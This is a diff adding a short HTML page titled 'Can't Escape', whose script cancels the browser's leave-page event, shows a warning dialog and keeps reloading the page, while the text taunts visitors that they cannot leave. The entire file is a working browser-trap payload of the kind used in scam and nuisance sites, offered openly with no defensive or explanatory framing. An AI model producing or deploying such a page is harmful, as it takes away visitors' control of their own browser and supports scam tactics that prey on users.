@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Can't Escape</title>
+    <script type="text/javascript">
+        // Function to handle the user trying to navigate away
+        window.onbeforeunload = function(event) {
+            setTimeout(function() {
+                window.location.href = window.location.href;  // Redirect to the same URL
+            }, 10);  // Small delay to allow navigation event to occur, then redirect back
+            event.preventDefault();
+            event.returnValue = '';  // Display a warning dialog in some browsers
+        };
+    </script>
+</head>
+<body>
+    <h1>You're stuck here! 😈</h1>
+    <p>No matter how hard you try, you can't leave this page.</p>
+</body>
+</html>
